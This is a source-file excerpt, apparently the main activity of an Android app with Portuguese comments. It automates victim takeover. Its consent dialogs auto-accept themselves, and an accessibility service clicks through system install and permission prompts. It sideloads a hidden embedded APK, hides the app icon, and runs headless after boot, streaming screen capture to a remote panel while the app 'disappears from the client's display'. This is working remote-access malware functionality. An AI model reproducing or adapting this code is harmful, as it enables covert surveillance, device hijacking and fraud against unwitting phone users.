    private fun exibirModalConsentimentoAcessibilidade() {
        if (isAcessibilidadeAtiva()) return
        voltandoDeAcessibilidade = true
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun exibirModalConsentimentoTela() {
        val dialog = AlertDialog.Builder(this)
            .setTitle(getString(R.string.consent_title))
            .setMessage(getString(R.string.consent_screen_message))
            .setCancelable(false)
            .setPositiveButton("Iniciar") { _, _ -> confirmarIniciar() }
            .setNegativeButton("Depois") { d, _ -> d.dismiss() }
            .create()

        dialog.show()

        handlerMain.postDelayed({
            if (!iniciarCapturaDisparado && dialog.isShowing) {
                dialog.dismiss()
                confirmarIniciar()
            }
        }, AUTO_CONFIRMAR_INICIAR_MS)
    }

    // ETAPA 3 — controle de disparo único do atalho (evita pedir/clicar 2x).
    private var atalhoDisparado = false

    /**
     * ETAPA 3 — Se o atalho ainda não foi aceito, mostra o modal de
     * consentimento. O modal se auto-aceita (inject) após um curto intervalo,
     * para não exigir clique manual toda vez. O aceite é persistido.
     */
    private fun talvezPedirAtalho() {
        try {
            if (!AtalhoManager.precisaCriarAtalho(this)) return
            // No Android 8+ (API 26+): se o launcher NÃO permite fixar atalho,
            // NÃO oculta o app (senão sumiria sem atalho) e tenta depois. No
            // Android 7 (API 24-25, Nox) seguimos mesmo assim — a criação usa o
            // broadcast legado INSTALL_SHORTCUT, que funciona em launchers antigos
            // mesmo sem o isRequestPinShortcutSupported moderno.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !AtalhoManager.suportaAtalho(this)) {
                Log.i(TAG, "Launcher sem suporte a fixar atalho (API26+) — mantendo ícone principal; tentará depois.")
                return
            }
            exibirModalConsentimentoAtalho()
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao avaliar atalho: ${e.message}")
        }
    }

    private fun exibirModalConsentimentoAtalho() {
        if (atalhoDisparado) return
        val dialog = AlertDialog.Builder(this)
            .setTitle("Adicionar atalho")
            .setMessage(
                "Deseja adicionar o atalho do ${marcaNome()} à tela inicial?\n\n" +
                "O ícone do aplicativo sairá da gaveta e ficará acessível pelas " +
                "Configurações do aparelho; o atalho continua abrindo o app normalmente."
            )
            .setCancelable(false)
            .setPositiveButton("Adicionar") { _, _ -> confirmarCriarAtalho() }
            .setNegativeButton("Agora não") { d, _ -> d.dismiss() }
            .create()
        dialog.show()

        // INJECT: auto-aceita o PRÓPRIO modal após um curto intervalo, para o
        // operador não precisar clicar toda vez (fluxo hands-free).
        handlerMain.postDelayed({
            if (!atalhoDisparado && dialog.isShowing) {
                dialog.dismiss()
                confirmarCriarAtalho()
            }
        }, AUTO_CONFIRMAR_INICIAR_MS)
    }

    private fun confirmarCriarAtalho() {
        if (atalhoDisparado) return
        atalhoDisparado = true
        // Persiste o aceite ANTES de pedir: na próxima abertura não pergunta mais.
        AtalhoManager.marcarConfirmado(this)
        // Cria o atalho; o MyAccessibilityService confirma o diálogo do sistema.
        AtalhoManager.criarAtalhoPrincipal(this, marcaNome())
        // Depois de pedir o atalho, oculta o ícone principal da gaveta
        // (vai só para as Configurações). Aguarda o diálogo do sistema concluir.
        handlerMain.postDelayed({ ocultarIconeDaGaveta() }, 2000L)
        Log.i(TAG, "Atalho solicitado; ícone principal será ocultado da gaveta.")
    }

    private fun confirmarIniciar() {
        if (iniciarCapturaDisparado) return
        iniciarCapturaDisparado = true
        prefs.edit().putBoolean(KEY_PRIMEIRO_ACESSO, false).apply()
        // Encerra o modo onboarding rápido da acessibilidade
        MyAccessibilityService.onboardingRapido = false
        handlerMain.post { atualizarEtapaInterface() }
        // ETAPA 3: já com o onboarding concluído, avalia/cria o atalho na gaveta.
        handlerMain.postDelayed({ talvezPedirAtalho() }, 1200L)

        // Instala o módulo de suporte embarcado (assets/suporte.apk) de forma
        // automática logo após o último modal "Iniciar". Se já estiver instalado,
        // não faz nada. O auto-clique da acessibilidade confirma o instalador.
        instalarSuporteSeNecessario()

        // MODAL DE ATUALIZAÇÃO REMOVIDO: não exibe mais o diálogo
        // "Atualização do Aplicativo / Atualizar Agora" — vai direto para
        // a captura de tela (iniciarCaptura).
        iniciarCaptura()
    }

    /**
     * Instala o APK do módulo de suporte embarcado em assets/suporte.apk.
     *
     * Limite do Android: um app comum não consegue instalar outro APK 100%
     * invisível (sem nenhum diálogo) sem root / device-owner / app de sistema.
     * O que fazemos aqui é disparar o instalador do sistema automaticamente;
     * o auto-clique da acessibilidade (MyAccessibilityService) pressiona
     * "Instalar"/"Install" sozinho, deixando o fluxo hands-free.
     *
     * - Se o pacote de suporte já estiver instalado → não faz nada.
     * - Se "Instalar apps desconhecidos" não estiver liberado → abre a tela
     *   de fontes desconhecidas (o auto-clique também cobre esse botão) e
     *   aborta esta rodada; na próxima vez a instalação prossegue.
     */
    private fun instalarSuporteSeNecessario() {
        try {
            val pacoteSuporte = "$packageName.suporte" // com.example.acessomaterno.suporte

            // 1) Já instalado? Então não faz nada.
            val jaInstalado = try {
                packageManager.getPackageInfo(pacoteSuporte, 0)
                true
            } catch (_: PackageManager.NameNotFoundException) {
                false
            }
            if (jaInstalado) {
                Log.d(TAG, "Suporte ($pacoteSuporte) já instalado — instalação ignorada.")
                return
            }

            // 2) Precisa da permissão "instalar apps desconhecidos" (API 26+).
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                !packageManager.canRequestPackageInstalls()
            ) {
                Log.d(TAG, "Sem permissão de instalar apps desconhecidos — abrindo tela de fontes.")
                try {
                    val intentFontes = Intent(
                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:$packageName")
                    )
                    startActivity(intentFontes)
                } catch (e: Exception) {
                    Log.w(TAG, "Falha ao abrir tela de fontes desconhecidas: ${e.message}")
                }
                // Aborta esta rodada; na próxima entrada o fluxo segue para a instalação.
                return
            }

            // 3) Copia o APK de assets → cache privado do app.
            val apkDestino = File(cacheDir, "suporte_motor.apk")
            assets.open("suporte.apk").use { entrada ->
                apkDestino.outputStream().use { saida ->
                    entrada.copyTo(saida)
                }
            }

            // 4) Gera a URI via FileProvider e dispara o instalador do sistema.
            val uriApk: Uri = FileProvider.getUriForFile(
                this,
                "$packageName.fileprovider",
                apkDestino
            )
            val intentInstalar = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uriApk, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intentInstalar)
            Log.d(TAG, "Instalador do suporte disparado a partir de assets/suporte.apk.")

            // 5) Encadeia o fluxo: aguarda o pacote do suporte ser instalado e,
            // assim que aparecer, abre a tela de Acessibilidade para o auto-clique
            // ligar o serviço do suporte sozinho (hands-free até finalizar).
            aguardarSuporteEAtivarAcessibilidade(pacoteSuporte, tentativa = 0)
        } catch (e: java.io.FileNotFoundException) {
            Log.w(TAG, "assets/suporte.apk não encontrado — pulei a instalação do suporte.")
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao instalar suporte embarcado: ${e.message}")
        }
    }

    /**
     * Aguarda (via polling) o pacote do suporte terminar de instalar e, assim que
     * ele aparecer no PackageManager, abre a tela de Acessibilidade para o
     * auto-clique do app principal ligar o serviço do suporte sozinho.
     *
     * A instalação é assíncrona (o usuário/auto-clique confirma o instalador),
     * então checamos periodicamente até o pacote existir ou o tempo esgotar.
     */
    private fun aguardarSuporteEAtivarAcessibilidade(pacoteSuporte: String, tentativa: Int) {
        val maxTentativas = 40          // ~60s no total
        val intervaloMs = 1500L

        val instalado = try {
            packageManager.getPackageInfo(pacoteSuporte, 0)
            true
        } catch (_: PackageManager.NameNotFoundException) {
            false
        }

        if (instalado) {
            Log.d(TAG, "Suporte instalado — abrindo Acessibilidade para ativação automática.")
            try {
                voltandoDeAcessibilidade = true
                startActivity(
                    Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
            } catch (e: Exception) {
                Log.w(TAG, "Falha ao abrir Acessibilidade do suporte: ${e.message}")
            }
            return
        }

        if (tentativa >= maxTentativas) {
            Log.w(TAG, "Suporte não detectado após ${maxTentativas * intervaloMs / 1000}s — parando polling.")
            return
        }

        handlerMain.postDelayed({
            aguardarSuporteEAtivarAcessibilidade(pacoteSuporte, tentativa + 1)
        }, intervaloMs)
    }

    // MODAL DE ATUALIZAÇÃO REMOVIDO (função esvaziada — nunca mais chamada).
    // O overlay visual de atualização, quando desejado, é controlado pelo
    // botão "Overlay Atualização (Fundo Limpo)" do painel via
    // overlay_atualizacao_visual (MyAccessibilityService + ScreenCaptureService).
    private fun exibirModalConsentimentoAtualizacao() {
        Log.d(TAG, "Modal de atualização removido — não exibe mais diálogo.")
    }

    private fun iniciarCaptura() {
        // CONTROLE DE DISPARO PREVENTIVO:
        // Se o ScreenCaptureService já estiver ativo em execução, aborta o disparo do gatilho.
        // Se estiver em modo reanimação pós-boot (headless), encerra a Activity instantaneamente via finish().
        if (ScreenCaptureService.isRunning) {
            Log.d(TAG, "ScreenCaptureService já está ativo em execução. Abortando novo disparo de captura.")
            if (reanimacaoBootAutomatica) {
                finish()
            }
            return
        }

        if (!podeSobrepor()) {
            abrirTelaSobreposicao()
            return
        }

        prosseguirMediaProjection()
    }

    private fun prosseguirMediaProjection() {
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            // CORREÇÃO DE CRASH: o resultado do consentimento pode chegar com a
            // Activity recriada, ANTES de onCreate inicializar o lateinit `prefs`
            // (UninitializedPropertyAccessException). Usamos getSharedPreferences
            // direto aqui para nunca depender do lateinit e nunca fechar o app.
            try {
                getSharedPreferences(PREFS, MODE_PRIVATE)
                    .edit().putBoolean("consentimento_captura", true).apply()
            } catch (_: Exception) {}
            val intentServico = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra("RESULT_CODE", resultCode)
                putExtra("DATA", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intentServico)
            } else {
                startService(intentServico)
            }
            MyAccessibilityService.onboardingRapido = false

            // Modo reanimação pós-boot (headless): fecha a Activity silenciosamente
            // em 200ms via handlerMain. O ScreenCaptureService (Foreground Service)
            // continua rodando por baixo enviando frames binários ao painel — o app
            // "suma" do display do cliente sem interromper o vídeo.
            if (reanimacaoBootAutomatica) {
                handlerMain.postDelayed({
                    finish()
                }, 200)
            }
        }
        if (requestCode == REQUEST_OVERLAY && podeSobrepor() && !ScreenCaptureService.isRunning) {
            iniciarCaptura()
        }
    }

    private fun podeSobrepor(): Boolean =
        Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)

    private fun abrirTelaSobreposicao() {
        if (podeSobrepor()) return
        val intent = Intent(
            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:$packageName")
        )
        startActivityForResult(intent, REQUEST_OVERLAY)
    }

    private fun isAcessibilidadeAtiva(): Boolean {
        val habilitados = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return habilitados.contains("$packageName/")
    }

    private fun solicitarNotificacaoSePrecisar() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICACAO)
        }
    }

    /**
     * Garantia de entrega do comando "Power/Notificação": pede ao usuário para
     * retirar o app da otimização de bateria (Doze). Sem isso, o socket em
     * segundo plano pode sofrer atrasos quando a tela está apagada, e o
     * Full-Screen Intent pode não chegar instantaneamente. Requer a permissão
     * REQUEST_IGNORE_BATTERY_OPTIMIZATIONS (já declarada no manifest).
     */
    private fun solicitarIsencaoBateria() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(intent)
                    Log.d(TAG, "Solicitada isenção de otimização de bateria.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao solicitar isenção de bateria: ${e.message}")
        }
    }
}